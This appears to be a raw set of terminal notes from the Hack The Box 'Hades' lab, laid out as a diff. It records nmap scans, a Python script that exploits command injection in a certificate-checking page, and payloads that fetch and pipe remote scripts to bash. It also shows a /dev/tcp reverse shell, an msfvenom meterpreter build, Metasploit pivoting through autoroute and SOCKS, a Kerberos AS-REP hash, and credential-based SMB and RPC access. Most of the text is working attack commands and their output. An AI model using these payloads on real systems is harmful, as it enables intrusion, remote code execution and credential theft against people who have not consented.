@@ -1,0 +1,2213 @@
+root@kali:/opt/impacket/examples# cat /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	kali
+127.0.0.1       de.deb.devuan.org http://de.deb.devuan.org http://de.deb.devuan.org/ http://ftp.br.debian.org/ ftp.br.debian.org
+192.168.3.203   hades.htb htb.local
+192.168.3.202   hades.htb htb.local
+192.168.3.201   hades.htb htb.local
+172.17.0.2      hades.htb htb.local
+10.13.38.16     hades.htb htb.local
+
+
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+root@kali:/opt/impacket/examples# nmap -sC -sV -O -oA 
+~nmap: option '-oA' requires an argument
+See the output of nmap -h for a summary of options.
+root@kali:/opt/impacket/examples# nmap -sC -sV -O -oA ~/nmap/Hades 10.13.38.16
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-18 22:38 EDT
+Nmap scan report for hades.htb (10.13.38.16)
+Host is up (0.13s latency).
+Not shown: 999 filtered ports
+PORT    STATE SERVICE  VERSION
+443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Gigantic Hosting | Home
+| ssl-cert: Subject: commonName=10.13.38.16/organizationName=Gigantic Hosting Limited/stateOrProvinceName=New York/countryName=US
+| Not valid before: 2019-09-04T21:52:00
+|_Not valid after:  2039-08-30T21:52:00
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2012|2008|2016|7|Vista (91%)
+OS CPE: cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
+Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows Server 2016 (85%), Microsoft Windows 7 Professional or Windows 8 (85%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (85%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (85%), Microsoft Windows 7 Professional (85%)
+No exact OS matches for host (test conditions non-ideal).
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 37.69 seconds
+
+
+
+#!/usr/bin/env python3
+import requests
+from cmd import Cmd
+from urllib3.exceptions import InsecureRequestWarning
+import re
+
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+
+class Terminal(Cmd):
+        prompt = '> '
+
+        def default(self, args):
+                """"""
+                try:
+                        data = {'name': args}
+                        response = requests.post(f'https://10.13.38.16/ssltools/certificate.php', data, timeout=5, verify=False)
+                        output = re.findall('<pre>\n(.*)\n<br>', response.text, re.DOTALL)[0]
+                        print(output)
+                except:
+                        0
+cmd = Terminal()
+cmd.cmdloop()
+
+
+
+I used this for it
+Then have a nc listener ncat --ssl -lnkvp 443 and you'll get the cmd response in the http request
+
+10.14.15.162/$(cat${IFS}*) for flag
+
+root@kali:~/Documents/HTB/Hades# python3 shell.py 10.14.15.228
+> 10.14.15.228/$(whoami)
+> 10.14.15.228/$(cmd)
+> 10.14.15.228/$(cat${IFS}*)
+
+
+
+root@kali:~# nc --ssl -lnvkp 443
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: SHA-1 fingerprint: 7EFA 8E05 2004 1302 B852 BA16 E35E 7344 A858 293D
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.13.38.16.
+Ncat: Connection from 10.13.38.16:50881.
+GET /www-data HTTP/1.1
+Host: 10.14.15.228
+User-Agent: curl/7.58.0
+Accept: */*
+
+Ncat: Connection from 10.13.38.16.
+Ncat: Connection from 10.13.38.16:50884.
+GET / HTTP/1.1
+Host: 10.14.15.228
+User-Agent: curl/7.58.0
+Accept: */*
+
+
+Ncat: Connection from 10.13.38.16.
+Ncat: Connection from 10.13.38.16:50902.
+GET /HADESFr4gil3_b1aCkli5tiNg HTTP/1.1
+Host: 10.14.15.228
+User-Agent: curl/7.58.0
+Accept: */*
+
+
+
+got shell now
+10.14.14.2/$(curl${IFS}10.14.14.2/rev${IFS}|bash)
+
+bash -i >& /dev/tcp/10.14.14.2/4444 0>&1 put in a file called rev and simple http:80
+
+
+oot@kali:~/Documents/HTB/Hades# rlwrap nc -lvnp 9337
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::9337
+Ncat: Listening on 0.0.0.0:9337
+
+Ncat: Connection from 10.13.38.16.
+Ncat: Connection from 10.13.38.16:50013.
+bash: cannot set terminal process group (41): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@cee1146c7ac1:/var/www/html/ssltools$
+www-data@cee1146c7ac1:/var/www/html/ssltools$
+
+www-data@cee1146c7ac1:/var/www/html/ssltools$ ls
+ls
+0fe092ba0_flag.txt
+certificate.php
+logo.png
+www-data@cee1146c7ac1:/var/www/html/ssltools$ cat 0fe092ba0_flag.txt
+cat 0fe092ba0_flag.txt
+HADES{Fr4gil3_b1aCkli5tiNg}
+www-data@cee1146c7ac1:/var/www/html/ssltools$
+
+
+
+
+system("curl --insecure -v https://$host 2>&1 | awk 'BEGIN { cert=0 } /^\* SSL connection/ { cert=1 } /^\*/ { if (cert) print }'");
+
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp -b '\x00\xff' LHOST=10.14.14.2 -n 100 -f elf -o xtc.elf
+
+
+
+
+
+proxychains curl https://192.168.99.1
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.99.1:443-<--denied
+curl: (7) Couldn't connect to server
+
+
+add /etc/hosts
+192.168.3.203   hades.htb htb.local
+192.168.3.202   hades.htb htb.local
+192.168.3.201   hades.htb htb.local
+10.13.38.16     hades.htb htb.local
+
+
+
+Nmap scan report for 192.168.99.1
+
+Host is up, received user-set (0.049s latency).
+
+Scanned at 2019-10-15 14:45:09 BST for 752s
+
+Not shown: 65521 filtered ports
+
+Reason: 65521 no-responses
+
+PORT      STATE SERVICE      REASON
+
+80/tcp    open  http         syn-ack
+
+135/tcp   open  loc-srv      syn-ack
+
+139/tcp   open  netbios-ssn  syn-ack
+
+443/tcp   open  https        syn-ack
+
+445/tcp   open  microsoft-ds syn-ack
+
+2179/tcp  open  unknown      syn-ack
+
+5985/tcp  open  unknown      syn-ack
+
+47001/tcp open  unknown      syn-ack
+
+49152/tcp open  unknown      syn-ack
+
+49153/tcp open  unknown      syn-ack
+
+49154/tcp open  unknown      syn-ack
+
+49155/tcp open  unknown      syn-ack
+
+49180/tcp open  unknown      syn-ack
+
+49181/tcp open  unknown      syn-ack
+5985
+
+winrm
+
+
+meterpreter > run autoroute -s 192.168.99.0/24
+
+
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+
+[*] Adding a route to 192.168.99.0/255.255.255.0...
+
+[+] Added route to 192.168.99.0/255.255.255.0 via 10.13.38.16
+
+[*] Use the -p option to list all active routes
+
+
+msf5 post(multi/manage/autoroute) > set SESSION 5
+SESSION => 5
+msf5 post(multi/manage/autoroute) > exploit
+
+[!] SESSION may not be compatible with this module.
+[*] Running module against 172.17.0.2
+[*] Searching for subnets to autoroute.
+[+] Route added to subnet 172.17.0.0/255.255.0.0 from host's routing table.
+[*] Post module execution completed
+
+
+
+proxychains smbclient -L 192.168.99.1 ProxyChains-3.1 (http://proxychains.sf.net) |S-chain|-<>-127.0.0.1:1080-<><>-192.168.99.1:445-<><>-OK protocol negotiation failed: NT_STATUS_IO_TIMEOUT
+
+
+meterpreter > portfwd add -l 8081 -p 80 -r 192.168.99.1 [*] Local TCP relay created: :8081 <-> 192.168.99.1:80 meterpreter > portfwd add -l 8443 -p 443 -r 192.168.99.1 [*] Local TCP relay created: :8443 <-> 192.168.99.1:443
+
+proxychains curl -k https://172.17.0.1/ssltools/certificate.php -d 'name=10.14.15.99/$(curl${IFS}10.14.15.99:8000/shell|bash)'
+
+
+
+
+
+
+$krb5asrep$23$bob@HTB.LOCAL:9fdaf9b1807fe81027e8e77df0736f7c$80d70f81c2b1cdf0d63b3aba3b11fcaf480fb7c6c8ca6526b99e85ff60f4339de8663f28ed0c5bb7581b18959a5fabe255fe53a29daf454826f2d669be9b550dd4e3ed6cda770e7d6d75b45e01c41412a52f52811cc86a9c75da04951cf7bc4f8ce229719983feb419ff36b0692f3277bc0f21723e90993b54c25d31fe6916f4252fcc8bd6b431c8872026dd99b26265988616a7c635805c249e0fb3c3b2fda96e40a6f533648e46e7fcce95e1d49722f8e877bd20cf335e53fc6b68f02d0707b2925d976aeeee194bdc7e55b866ecc21b6eabe410b8115a47b62c62cd95bd7decc26cbf9e8a
+
+
+
+
+
+wget https://raw.githubusercontent.com/yunchih/static-binaries/master/tcpdump
+
+
+
+proxychains python windapsearch.py -u HTB\\bob --dc-ip 192.168.3.203 -U(edited)
+
+
+
+remote_user
+lee
+bob
+kalle
+test-svc
+iis-svc
+Administrator
+krbtgt
+Guest
+
+
+
+ldap/e7c98eef-ad91-4fc1-86d7-5f2332c56dd2._msdcs.htb.local
+
+WSMAN/web.htb.local
+
+"homeDirectory": [ "\\\\dc1\\Users\\bob" ],
+
+remote_user@htb.local<mailto:remote_user@htb.local>
+
+
+proxychains ldapdomaindump -u htb.local\\bob -p 'Passw0rd1!' -n 192.168.3.203 192.168.3.203
+
+
+Nmap scan report for 192.168.56.1
+
+Host is up, received user-set (1.1s latency).
+
+Scanned at 2019-10-16 04:25:42 BST for 1103s
+
+Not shown: 990 closed ports
+
+Reason: 990 conn-refused
+
+PORT      STATE SERVICE      REASON
+
+80/tcp    open  http         syn-ack
+
+135/tcp   open  msrpc        syn-ack
+
+139/tcp   open  netbios-ssn  syn-ack
+
+443/tcp   open  https        syn-ack
+
+445/tcp   open  microsoft-ds syn-ack
+
+2179/tcp  open  vmrdp        syn-ack
+
+49152/tcp open  unknown      syn-ack
+
+49153/tcp open  unknown      syn-ack
+
+49154/tcp open  unknown      syn-ack
+
+49155/tcp open  unknown      syn-ack
+
+Nmap scan report for 192.168.99.1
+
+Host is up, received user-set (1.1s latency).
+
+Scanned at 2019-10-16 03:42:30 BST for 147s
+
+Not shown: 91 closed ports
+
+Reason: 91 conn-refused
+
+PORT      STATE SERVICE      REASON
+
+80/tcp    open  http         syn-ack
+
+135/tcp   open  msrpc        syn-ack
+
+139/tcp   open  netbios-ssn  syn-ack
+
+443/tcp   open  https        syn-ack
+
+445/tcp   open  microsoft-ds syn-ack
+
+49152/tcp open  unknown      syn-ack
+
+49153/tcp open  unknown      syn-ack
+
+49154/tcp open  unknown      syn-ack
+
+49155/tcp open  unknown      syn-ack
+
+Nmap scan report for 192.168.3.203
+
+Host is up, received user-set (1.1s latency).
+
+Scanned at 2019-10-16 04:06:06 BST for 131s
+
+Not shown: 95 closed ports
+
+Reason: 95 conn-refused
+
+PORT    STATE SERVICE      REASON
+
+53/tcp  open  domain       syn-ack
+
+88/tcp  open  kerberos-sec syn-ack
+
+135/tcp open  msrpc        syn-ack
+
+389/tcp open  ldap         syn-ack
+
+445/tcp open  microsoft-ds syn-ack
+
+
+
+Nmap scan report for 192.168.3.202
+
+Host is up, received user-set (1.1s latency).
+
+Scanned at 2019-10-16 04:08:42 BST for 145s
+
+Not shown: 92 closed ports
+
+Reason: 92 conn-refused
+
+PORT      STATE SERVICE      REASON
+
+80/tcp    open  http         syn-ack
+
+135/tcp   open  msrpc        syn-ack
+
+443/tcp   open  https        syn-ack
+
+445/tcp   open  microsoft-ds syn-ack
+
+49152/tcp open  unknown      syn-ack
+
+49153/tcp open  unknown      syn-ack
+
+49154/tcp open  unknown      syn-ack
+
+49155/tcp open  unknown      syn-ack
+
+
+
+
+
+run post/multi/manage/autoroute 192.168.99.0/24
+in the meterpreter shell to add the the box to pivot
+
+meterpreter > run autoroute -s 192.168.33.1/24
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+[*] Adding a route to 192.168.33.1/255.255.255.0...
+[+] Added route to 192.168.33.1/255.255.255.0 via 10.13.38.16
+[*] Use the -p option to list all active routes
+meterpreter > route
+
+IPv4 network routes
+===================
+
+    Subnet      Netmask      Gateway     Metric  Interface
+    ------      -------      -------     ------  ---------
+    0.0.0.0     0.0.0.0      172.17.0.1  0       eth0
+    172.17.0.0  255.255.0.0  0.0.0.0     0       eth0
+
+No IPv6 routes were found.
+meterpreter > run autoroute -p
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+
+Active Routing Table
+====================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   172.17.0.0         255.255.0.0        Session 5
+   192.168.33.1       255.255.255.0      Session 5
+   192.168.99.0       255.255.255.0      Session 5
+
+
+msf5 exploit(multi/handler) > route
+
+IPv4 Active Routing Table
+=========================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   172.17.0.0         255.255.0.0        Session 8
+   192.168.3.1        255.255.255.0      Session 8
+   192.168.99.1       255.255.255.0      Session 8
+
+[*] There are currently no IPv6 routes defined.
+
+
+[*] There are currently no IPv6 routes defined.
+msf5 exploit(multi/handler) > route add 192.168.33.1 255.255.255.0 8
+
+
+
+
+meterpreter > portfwd add -l 8081 -p 80 -r 192.168.99.1
+[*] Local TCP relay created: :8081 <-> 192.168.99.1:80
+meterpreter > portfwd add -l 8443 -p 443 -r 192.168.99.1
+[*] Local TCP relay created: :8443 <-> 192.168.99.1:443
+
+
+
+use auxiliary/server/socks4a
+
+127.0.0.1 1080
+
+
+
+
+proxychains curl -k https://172.17.0.1/ssltools/certificate.php -d 'name=10.14.15.99/$(curl${IFS}10.14.15.99:8000/shell|bash)'
+
+
+
+
+
+bruteforcing the SMB on 192.168.3.203
+
+cn: remote_user
+userPrincipalName: remote_user@htb.local<mailto:remote_user@htb.local>
+
+
+
+
+
+proxychains smbclient \\\\192.168.3.203\\Users -u 'htb.local/bob' -p 'Passw0rd1!'
+
+root@kali:/opt/impacket/examples#proxychains python smbclient.py 'hades.htb/bob:Passw0rd1!@192.168.3.203'
+
+cd bob
+
+get flag.txt
+
+HADES{DoNt_d1s4ble_K3rbeRos_Pre_aUth3nticat1on}
+
+root@kali:/opt/impacket/examples# proxychains python rpcdump.py 'hades.htb/bob:Passw0rd1!@192.168.3.203'
+ProxyChains-3.1 (http://proxychains.sf.net)
+Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Retrieving endpoint list from 192.168.3.203
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.3.203:135-<><>-OK
+Protocol: N/A 
+Provider: N/A 
+UUID    : 1A0D010F-1C33-432C-B0F5-8CF4E8053099 v1.0 IdSegSrv service
+Bindings: 
+          ncalrpc:[LRPC-93d0753b0f224f3c9f]
+
+Protocol: [MS-RAA]: Remote Authorization API Protocol 
+Provider: N/A 
+UUID    : 0B1C2170-5732-4E0E-8CD3-D9B16F3B84D7 v0.0 RemoteAccessCheck
+Bindings: 
+          ncalrpc:[NETLOGON_LRPC]
+          ncacn_ip_tcp:192.168.3.203[49676]
+          ncacn_np:\\DC1[\pipe\0260000ede56e870]
+          ncacn_http:192.168.3.203[49675]
+          ncalrpc:[NTDS_LPC]
+          ncalrpc:[OLE1F196D3368566614E01582270EC8]
+          ncacn_ip_tcp:192.168.3.203[49667]
+          ncalrpc:[samss lpc]
+          ncalrpc:[SidKey Local End Point]
+          ncalrpc:[protected_storage]
+          ncalrpc:[lsasspirpc]
+          ncalrpc:[lsapolicylookup]
+          ncalrpc:[LSA_EAS_ENDPOINT]
+          ncalrpc:[lsacap]
+          ncalrpc:[LSARPC_ENDPOINT]
+          ncalrpc:[securityevent]
+          ncalrpc:[audit]
+          ncacn_np:\\DC1[\pipe\lsass]
+          ncalrpc:[NETLOGON_LRPC]
+          ncacn_ip_tcp:192.168.3.203[49676]
+          ncacn_np:\\DC1[\pipe\0260000ede56e870]
+          ncacn_http:192.168.3.203[49675]
+          ncalrpc:[NTDS_LPC]
+          ncalrpc:[OLE1F196D3368566614E01582270EC8]
+          ncacn_ip_tcp:192.168.3.203[49667]
+          ncalrpc:[samss lpc]
+          ncalrpc:[SidKey Local End Point]
+          ncalrpc:[protected_storage]
+          ncalrpc:[lsasspirpc]
+          ncalrpc:[lsapolicylookup]
+          ncalrpc:[LSA_EAS_ENDPOINT]
+          ncalrpc:[lsacap]
+          ncalrpc:[LSARPC_ENDPOINT]
+          ncalrpc:[securityevent]
+          ncalrpc:[audit]
+          ncacn_np:\\DC1[\pipe\lsass]
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : 3A9EF155-691D-4449-8D05-09AD57031823 v1.0 
+Bindings: 
+          ncacn_ip_tcp:192.168.3.203[49666]
+          ncalrpc:[ubpmtaskhostchannel]
+          ncacn_np:\\DC1[\PIPE\atsvc]
+          ncalrpc:[senssvc]
+          ncalrpc:[OLEC96926DF76064A1E9EFA72B4AB99]
+          ncalrpc:[IUserProfile2]
+
+Protocol: N/A 
+Provider: schedsvc.dll 
+UUID    : 0A74EF1C-41A4-4E06-83AE-DC74FB1CDD53 v1.0 
+Bindings: 
+          ncalrpc:[senssvc]
+          ncalrpc:[OLEC96926DF76064A1E9EFA72B4AB99]
+          ncalrpc:[IUserProfile2]
+
+Protocol: N/A 
+Provider: nsisvc.dll 
+UUID    : 7EA70BCF-48AF-4F6A-8968-6A440754D5FA v1.0 NSI server endpoint
+Bindings: 
+          ncalrpc:[LRPC-faee6d1d22562d2209]
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : 98CD761E-E77D-41C8-A3C0-0FB756D90EC2 v1.0 
+Bindings: 
+          ncalrpc:[LRPC-fb56e45dea1f9d8d02]
+
+Protocol: [MS-CMPO]: MSDTC Connection Manager: 
+Provider: msdtcprx.dll 
+UUID    : 906B0CE0-C70B-1067-B317-00DD010662DA v1.0 
+Bindings: 
+          ncalrpc:[LRPC-c06ce40dba6c9fd6be]
+          ncalrpc:[LRPC-c06ce40dba6c9fd6be]
+          ncalrpc:[LRPC-c06ce40dba6c9fd6be]
+
+Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol 
+Provider: taskcomp.dll 
+UUID    : 1FF70682-0A51-30E8-076D-740BE8CEE98B v1.0 
+Bindings: 
+          ncacn_np:\\DC1[\PIPE\atsvc]
+          ncalrpc:[senssvc]
+          ncalrpc:[OLEC96926DF76064A1E9EFA72B4AB99]
+          ncalrpc:[IUserProfile2]
+
+Protocol: N/A 
+Provider: dhcpcsvc6.dll 
+UUID    : 3C4728C5-F0AB-448B-BDA1-6CE01EB0A6D6 v1.0 DHCPv6 Client LRPC Endpoint
+Bindings: 
+          ncalrpc:[dhcpcsvc6]
+          ncacn_ip_tcp:192.168.3.203[49665]
+          ncacn_np:\\DC1[\pipe\eventlog]
+          ncalrpc:[eventlog]
+
+Protocol: N/A 
+Provider: efssvc.dll 
+UUID    : 04EEB297-CBF4-466B-8A2A-BFD6A2F10BBA v1.0 EFSK RPC Interface
+Bindings: 
+          ncacn_np:\\DC1[\pipe\efsrpc]
+          ncalrpc:[LRPC-197fc818c8e864c90c]
+
+Protocol: [MS-RSP]: Remote Shutdown Protocol 
+Provider: wininit.exe 
+UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0 
+Bindings: 
+          ncacn_ip_tcp:192.168.3.203[49664]
+          ncalrpc:[WindowsShutdown]
+          ncacn_np:\\DC1[\PIPE\InitShutdown]
+          ncalrpc:[WMsgKRpc0818D0]
+
+Protocol: N/A 
+Provider: sysmain.dll 
+UUID    : B58AA02E-2884-4E97-8176-4EE06D794184 v1.0 
+Bindings: 
+          ncalrpc:[LRPC-fb5758fbb330952d93]
+
+Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol 
+Provider: taskcomp.dll 
+UUID    : 378E52B0-C0A9-11CF-822D-00AA0051E40F v1.0 
+Bindings: 
+          ncacn_np:\\DC1[\PIPE\atsvc]
+          ncalrpc:[senssvc]
+          ncalrpc:[OLEC96926DF76064A1E9EFA72B4AB99]
+          ncalrpc:[IUserProfile2]
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : A500D4C6-0DD1-4543-BC0C-D5F93486EAF8 v1.0 
+Bindings: 
+          ncalrpc:[LRPC-62116bb2ba5ebb8b3c]
+          ncalrpc:[LRPC-b1f8d6bc8cd5c96354]
+          ncalrpc:[d0e70294-defa-4a79-bce2-39dfea4290ed]
+          ncalrpc:[LRPC-c2e78e7da4d933fe4f]
+          ncalrpc:[dhcpcsvc]
+          ncalrpc:[dhcpcsvc6]
+          ncacn_ip_tcp:192.168.3.203[49665]
+          ncacn_np:\\DC1[\pipe\eventlog]
+          ncalrpc:[eventlog]
+
+Protocol: N/A 
+Provider: BFE.DLL 
+UUID    : DD490425-5325-4565-B774-7E27D6C09C24 v1.0 Base Firewall Engine API
+Bindings: 
+          ncalrpc:[LRPC-a28c44492b06b19d19]
+
+Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol 
+Provider: schedsvc.dll 
+UUID    : 86D35949-83C9-4044-B424-DB363231FD0C v1.0 
+Bindings: 
+          ncacn_ip_tcp:192.168.3.203[49666]
+          ncalrpc:[ubpmtaskhostchannel]
+          ncacn_np:\\DC1[\PIPE\atsvc]
+          ncalrpc:[senssvc]
+          ncalrpc:[OLEC96926DF76064A1E9EFA72B4AB99]
+          ncalrpc:[IUserProfile2]
+
+Protocol: [MS-DRSR]: Directory Replication Service (DRS) Remote Protocol 
+Provider: ntdsai.dll 
+UUID    : E3514235-4B06-11D1-AB04-00C04FC2DCD2 v4.0 MS NT Directory DRS Interface
+Bindings: 
+          ncacn_np:\\DC1[\pipe\0260000ede56e870]
+          ncacn_http:192.168.3.203[49675]
+          ncalrpc:[NTDS_LPC]
+          ncalrpc:[OLE1F196D3368566614E01582270EC8]
+          ncacn_ip_tcp:192.168.3.203[49667]
+          ncalrpc:[samss lpc]
+          ncalrpc:[SidKey Local End Point]
+          ncalrpc:[protected_storage]
+          ncalrpc:[lsasspirpc]
+          ncalrpc:[lsapolicylookup]
+          ncalrpc:[LSA_EAS_ENDPOINT]
+          ncalrpc:[lsacap]
+          ncalrpc:[LSARPC_ENDPOINT]
+          ncalrpc:[securityevent]
+          ncalrpc:[audit]
+          ncacn_np:\\DC1[\pipe\lsass]
+
+Protocol: N/A 
+Provider: gpsvc.dll 
+UUID    : 2EB08E3E-639F-4FBA-97B1-14F878961076 v1.0 Group Policy RPC Interface
+Bindings: 
+          ncalrpc:[LRPC-a438e16ff847b9a3c4]
+
+Protocol: N/A 
+Provider: iphlpsvc.dll 
+UUID    : 552D076A-CB29-4E44-8B6A-D15E59E2C0AF v1.0 IP Transition Configuration endpoint
+Bindings: 
+          ncacn_ip_tcp:192.168.3.203[49666]
+          ncalrpc:[ubpmtaskhostchannel]
+          ncacn_np:\\DC1[\PIPE\atsvc]
+          ncalrpc:[senssvc]
+          ncalrpc:[OLEC96926DF76064A1E9EFA72B4AB99]
+          ncalrpc:[IUserProfile2]
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : B18FBAB6-56F8-4702-84E0-41053293A869 v1.0 UserMgrCli
+Bindings: 
+          ncalrpc:[LRPC-5bf84be31a674227f6]
+          ncalrpc:[TeredoControl]
+          ncalrpc:[TeredoDiagnostics]
+          ncacn_ip_tcp:192.168.3.203[49666]
+          ncalrpc:[ubpmtaskhostchannel]
+          ncacn_np:\\DC1[\PIPE\atsvc]
+          ncalrpc:[senssvc]
+          ncalrpc:[OLEC96926DF76064A1E9EFA72B4AB99]
+          ncalrpc:[IUserProfile2]
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : 2E6035B2-E8F1-41A7-A044-656B439C4C34 v1.0 Proxy Manager provider server endpoint
+Bindings: 
+          ncalrpc:[TeredoControl]
+          ncalrpc:[TeredoDiagnostics]
+          ncacn_ip_tcp:192.168.3.203[49666]
+          ncalrpc:[ubpmtaskhostchannel]
+          ncacn_np:\\DC1[\PIPE\atsvc]
+          ncalrpc:[senssvc]
+          ncalrpc:[OLEC96926DF76064A1E9EFA72B4AB99]
+          ncalrpc:[IUserProfile2]
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : D22895EF-AFF4-42C5-A5B2-B14466D34AB4 v1.0 
+Bindings: 
+          ncalrpc:[LRPC-fb56e45dea1f9d8d02]
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : 9B008953-F195-4BF9-BDE0-4471971E58ED v1.0 
+Bindings: 
+          ncalrpc:[LRPC-f222a21550e079f494]
+          ncalrpc:[LRPC-f78e43254ce4a14d5f]
+          ncacn_np:\\DC1[\pipe\LSM_API_service]
+          ncalrpc:[LSMApi]
+          ncalrpc:[LRPC-da1d63850365bf8740]
+          ncalrpc:[actkernel]
+          ncalrpc:[umpo]
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : 95095EC8-32EA-4EB0-A3E2-041F97B36168 v1.0 
+Bindings: 
+          ncalrpc:[LRPC-fb56e45dea1f9d8d02]
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : C49A5A70-8A7F-4E70-BA16-1E8F1F193EF1 v1.0 Adh APIs
+Bindings: 
+          ncalrpc:[TeredoControl]
+          ncalrpc:[TeredoDiagnostics]
+          ncacn_ip_tcp:192.168.3.203[49666]
+          ncalrpc:[ubpmtaskhostchannel]
+          ncacn_np:\\DC1[\PIPE\atsvc]
+          ncalrpc:[senssvc]
+          ncalrpc:[OLEC96926DF76064A1E9EFA72B4AB99]
+          ncalrpc:[IUserProfile2]
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : F47433C3-3E9D-4157-AAD4-83AA1F5C2D4C v1.0 Fw APIs
+Bindings: 
+          ncalrpc:[LRPC-ff1e54b3d6edd66795]
+          ncalrpc:[LRPC-d823a13c483e3b771d]
+          ncalrpc:[LRPC-a28c44492b06b19d19]
+
+Protocol: [MS-SAMR]: Security Account Manager (SAM) Remote Protocol 
+Provider: samsrv.dll 
+UUID    : 12345778-1234-ABCD-EF00-0123456789AC v1.0 
+Bindings: 
+          ncacn_ip_tcp:192.168.3.203[49676]
+          ncacn_np:\\DC1[\pipe\0260000ede56e870]
+          ncacn_http:192.168.3.203[49675]
+          ncalrpc:[NTDS_LPC]
+          ncalrpc:[OLE1F196D3368566614E01582270EC8]
+          ncacn_ip_tcp:192.168.3.203[49667]
+          ncalrpc:[samss lpc]
+          ncalrpc:[SidKey Local End Point]
+          ncalrpc:[protected_storage]
+          ncalrpc:[lsasspirpc]
+          ncalrpc:[lsapolicylookup]
+          ncalrpc:[LSA_EAS_ENDPOINT]
+          ncalrpc:[lsacap]
+          ncalrpc:[LSARPC_ENDPOINT]
+          ncalrpc:[securityevent]
+          ncalrpc:[audit]
+          ncacn_np:\\DC1[\pipe\lsass]
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : DF4DF73A-C52D-4E3A-8003-8437FDF8302A v0.0 WM_WindowManagerRPC\Server
+Bindings: 
+          ncalrpc:[LRPC-65757206069fe32b76]
+
+Protocol: [MS-SCMR]: Service Control Manager Remote Protocol 
+Provider: services.exe 
+UUID    : 367ABB81-9844-35F1-AD32-98F038001003 v2.0 
+Bindings: 
+          ncacn_ip_tcp:192.168.3.203[49681]
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : F2C9B409-C1C9-4100-8639-D8AB1486694A v1.0 Witness Client Upcall Server
+Bindings: 
+          ncalrpc:[LRPC-ac4e08b2f16982bf47]
+          ncalrpc:[DNSResolver]
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : 4C9DBF19-D39E-4BB9-90EE-8F7179B20283 v1.0 
+Bindings: 
+          ncalrpc:[LRPC-fb56e45dea1f9d8d02]
+
+Protocol: [MS-FRS2]: Distributed File System Replication Protocol 
+Provider: dfsrmig.exe 
+UUID    : 897E2E5F-93F3-4376-9C9C-FD2277495C27 v1.0 Frs2 Service
+Bindings: 
+          ncacn_ip_tcp:192.168.3.203[49733]
+          ncalrpc:[OLE537AD2DB8D08E3E6B13E5F014077]
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : EB081A0D-10EE-478A-A1DD-50995283E7A8 v3.0 Witness Client Test Interface
+Bindings: 
+          ncalrpc:[LRPC-ac4e08b2f16982bf47]
+          ncalrpc:[DNSResolver]
+
+Protocol: N/A 
+Provider: dhcpcsvc.dll 
+UUID    : 3C4728C5-F0AB-448B-BDA1-6CE01EB0A6D5 v1.0 DHCP Client LRPC Endpoint
+Bindings: 
+          ncalrpc:[dhcpcsvc]
+          ncalrpc:[dhcpcsvc6]
+          ncacn_ip_tcp:192.168.3.203[49665]
+          ncacn_np:\\DC1[\pipe\eventlog]
+          ncalrpc:[eventlog]
+
+Protocol: [MS-NRPC]: Netlogon Remote Protocol 
+Provider: netlogon.dll 
+UUID    : 12345678-1234-ABCD-EF00-01234567CFFB v1.0 
+Bindings: 
+          ncalrpc:[NETLOGON_LRPC]
